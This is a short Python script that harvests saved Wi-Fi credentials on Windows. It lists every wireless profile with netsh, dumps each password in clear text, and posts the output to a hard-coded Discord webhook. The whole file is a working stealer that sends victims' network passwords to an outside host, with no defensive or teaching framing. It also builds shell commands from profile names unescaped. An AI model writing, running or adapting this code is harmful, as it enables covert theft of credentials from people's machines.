#!/usr/bin/env python

import subprocess
import re
import requests
import json


url = "https://discord.com/api/webhooks/795938695643004949/ykSa4rrVf3ILQPFRFKlemqGvymCgU4PFMikij4nxNlCCf-NUrsfqrD4XZ1xFa2umDumx"

command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True).decode('utf-8')
names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
result = ""
for name in names_list:
    try:
        command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
        current_result = str(subprocess.check_output(command, shell=True).decode('utf-8'))
    except subprocess.CalledProcessError :
        current_result = "error"
        #print("Error occurred with %s ", name)
    result = result + current_result
    data = {'content': current_result}
    requests.post(url=url, data=json.dumps(data), headers={'Content-Type': "application/json"})







